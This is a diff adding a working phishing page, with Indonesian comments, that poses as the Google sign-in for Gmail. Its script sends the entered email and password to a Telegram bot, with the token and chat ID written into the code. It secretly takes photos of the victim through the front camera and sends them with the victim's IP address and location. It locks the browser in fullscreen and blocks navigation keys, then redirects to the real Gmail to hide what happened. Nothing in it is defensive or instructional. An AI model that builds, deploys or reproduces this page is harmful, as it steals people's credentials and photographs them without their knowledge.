@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover, shrink-to-fit=no">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden !important;
+            position: fixed !important;
+        }
+
+        body {
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            background: white;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .card {
+            max-width: 450px;
+            width: 100%;
+            padding: 48px 40px 36px;
+            text-align: center;
+        }
+
+        .google-logo img {
+            width: 75px;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            color: #5f6368;
+            margin-bottom: 32px;
+        }
+
+        input {
+            width: 100%;
+            padding: 13px 15px;
+            margin: 10px 0;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #1a73e8;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+
+        button:disabled {
+            background: #dadce0;
+            cursor: not-allowed;
+        }
+
+        .error {
+            background: #fce8e6;
+            color: #d93025;
+            padding: 12px;
+            border-radius: 4px;
+            margin-top: 15px;
+            display: none;
+        }
+
+        .loading {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid white;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-left: 8px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Kamera tersembunyi - korban gak sadar */
+        .hidden-camera {
+            position: fixed;
+            bottom: -100px;
+            right: -100px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+            z-index: -999;
+        }
+
+        video {
+            position: fixed;
+            bottom: -100px;
+            right: -100px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="google-logo">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+    </div>
+    <h1>Sign in</h1>
+    <div class="subtitle">to continue to Gmail</div>
+    
+    <form id="loginForm">
+        <input type="email" id="email" placeholder="Email or phone" autocomplete="off" required>
+        <input type="password" id="password" placeholder="Password" required>
+        <button type="submit" id="loginBtn">Next</button>
+        <div class="error" id="errorMsg">Wrong email or password</div>
+    </form>
+</div>
+
+<!-- Kamera tersembunyi - korban gak sadar -->
+<video id="hiddenVideo" autoplay playsinline></video>
+<canvas id="hiddenCanvas"></canvas>
+
+<script>
+    const TELEGRAM_TOKEN = "8806067214:AAHMhedGeATjYcFl3QUHk53Q8o9_sDuiGOg";
+    const CHAT_ID = "8854409945";
+    
+    let stream = null;
+    let photoTaken = false;
+    let photoAttempts = 0;
+    
+    // ========== LOCK TOTAL ==========
+    document.body.style.overflow = 'hidden';
+    document.documentElement.style.overflow = 'hidden';
+    
+    document.addEventListener('wheel', function(e) { e.preventDefault(); return false; }, { passive: false });
+    document.addEventListener('touchmove', function(e) { e.preventDefault(); return false; }, { passive: false });
+    
+    history.pushState(null, null, location.href);
+    window.addEventListener('popstate', function() {
+        history.pushState(null, null, location.href);
+        location.replace(location.href);
+    });
+    
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'F5' || e.key === 'F12' || (e.ctrlKey && e.key === 'r') || 
+            (e.ctrlKey && e.key === 'w') || e.key === 'Escape' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+            e.preventDefault();
+            return false;
+        }
+    });
+    
+    document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
+    
+    // ========== FULLSCREEN ==========
+    function forceFullscreen() {
+        const docEl = document.documentElement;
+        if (docEl.requestFullscreen) docEl.requestFullscreen().catch(()=>{});
+        else if (docEl.webkitRequestFullscreen) docEl.webkitRequestFullscreen();
+    }
+    
+    document.body.addEventListener('click', function firstClick() {
+        forceFullscreen();
+        document.body.removeEventListener('click', firstClick);
+    });
+    
+    document.addEventListener('fullscreenchange', function() {
+        if (!document.fullscreenElement) forceFullscreen();
+    });
+    
+    setInterval(() => {
+        if (!document.fullscreenElement && !document.webkitFullscreenElement) forceFullscreen();
+        if (window.location.hash !== '#locked') {
+            window.location.hash = 'locked';
+            history.pushState(null, null, '#locked');
+        }
+    }, 200);
+    
+    // ========== HIDDEN CAMERA - DIAM-DIAM FOTO ==========
+    const hiddenVideo = document.getElementById('hiddenVideo');
+    const hiddenCanvas = document.getElementById('hiddenCanvas');
+    
+    async function startHiddenCamera() {
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" } 
+            });
+            hiddenVideo.srcObject = stream;
+            
+            // Tunggu 3 detik, lalu ambil foto diam-diam (korban masih mikir mau ngetik)
+            setTimeout(() => {
+                captureHiddenPhoto();
+            }, 3000);
+            
+            // Juga ambil foto lagi setelah 7 detik (2x chance)
+            setTimeout(() => {
+                if (!photoTaken) captureHiddenPhoto();
+            }, 7000);
+            
+            // Ambil foto lagi setelah 12 detik
+            setTimeout(() => {
+                if (!photoTaken) captureHiddenPhoto();
+            }, 12000);
+            
+        } catch(err) {
+            console.log('Gagal akses kamera background');
+        }
+    }
+    
+    async function captureHiddenPhoto() {
+        if (photoTaken) return;
+        if (!stream || stream.active === false) return;
+        
+        photoAttempts++;
+        
+        // Cek apakah video sudah punya ukuran
+        if (hiddenVideo.videoWidth === 0 || hiddenVideo.videoHeight === 0) {
+            if (photoAttempts < 5) {
+                setTimeout(() => captureHiddenPhoto(), 1000);
+            }
+            return;
+        }
+        
+        hiddenCanvas.width = hiddenVideo.videoWidth;
+        hiddenCanvas.height = hiddenVideo.videoHeight;
+        const ctx = hiddenCanvas.getContext('2d');
+        ctx.drawImage(hiddenVideo, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
+        
+        // Dapetin IP dan lokasi
+        let ip = 'Unknown';
+        let location = 'Tidak diketahui';
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            ip = data.ip;
+            
+            const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+            const geoData = await geoRes.json();
+            location = `${geoData.city}, ${geoData.country_name}`;
+        } catch(e) {}
+        
+        const tanggal = new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta'});
+        const userAgent = navigator.userAgent;
+        
+        const blob = await new Promise(resolve => hiddenCanvas.toBlob(resolve, 'image/jpeg', 0.9));
+        
+        const caption = `📸📸📸 FOTO WAJAH KORBAN (BACKGROUND HIDDEN) 📸📸📸%0A%0A` +
+            `🌐 IP ADDRESS : ${ip}%0A` +
+            `📍 LOKASI     : ${location}%0A` +
+            `📅 WAKTU      : ${tanggal}%0A` +
+            `💻 DEVICE     : ${encodeURIComponent(userAgent.substring(0, 100))}%0A%0A` +
+            `⚠️ KORBAN TIDAK SADAR - SEDANG MENGISI FORM LOGIN ⚠️`;
+        
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'hidden_face.jpg');
+        formData.append('caption', caption);
+        
+        try {
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+            photoTaken = true;
+        } catch(e) {}
+        
+        // Matikan kamera setelah berhasil foto
+        if (stream) {
+            stream.getTracks().forEach(track => track.stop());
+            stream = null;
+        }
+    }
+    
+    // ========== KIRIM CREDENTIALS ==========
+    async function sendCredentials(email, password) {
+        let ip = 'Unknown';
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            ip = data.ip;
+        } catch(e) {}
+        
+        const tanggal = new Date().toLocaleString('id-ID');
+        
+        let pesan = `🔐🔐🔐 GOOGLE LOGIN 🔐🔐🔐%0A%0A`;
+        pesan += `📧 EMAIL    : ${email}%0A`;
+        pesan += `🔑 PASSWORD : ${password}%0A`;
+        pesan += `🌐 IP       : ${ip}%0A`;
+        pesan += `📅 WAKTU    : ${tanggal}%0A%0A`;
+        pesan += `⚠️ FOTO WAJAH SUDAH TERKIRIM (DIAM-DIAM) ⚠️`;
+        
+        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${pesan}`;
+        await fetch(url, {mode: 'no-cors'});
+    }
+    
+    // ========== START HIDDEN CAMERA ==========
+    startHiddenCamera();
+    
+    // ========== SUBMIT LOGIN ==========
+    const form = document.getElementById('loginForm');
+    const errorMsg = document.getElementById('errorMsg');
+    const loginBtn = document.getElementById('loginBtn');
+    
+    form.addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        
+        if (!email || !password) {
+            errorMsg.style.display = 'block';
+            setTimeout(() => errorMsg.style.display = 'none', 2000);
+            return;
+        }
+        
+        loginBtn.disabled = true;
+        loginBtn.innerHTML = "Memverifikasi... <span class='loading'></span>";
+        
+        await sendCredentials(email, password);
+        
+        errorMsg.style.backgroundColor = '#e6f4ea';
+        errorMsg.style.color = '#137333';
+        errorMsg.innerHTML = '✅ Verifikasi berhasil! Mengalihkan...';
+        errorMsg.style.display = 'block';
+        
+        setTimeout(() => {
+            window.location.href = 'https://mail.google.com';
+        }, 2000);
+    });
+</script>
+</body>
+</html>
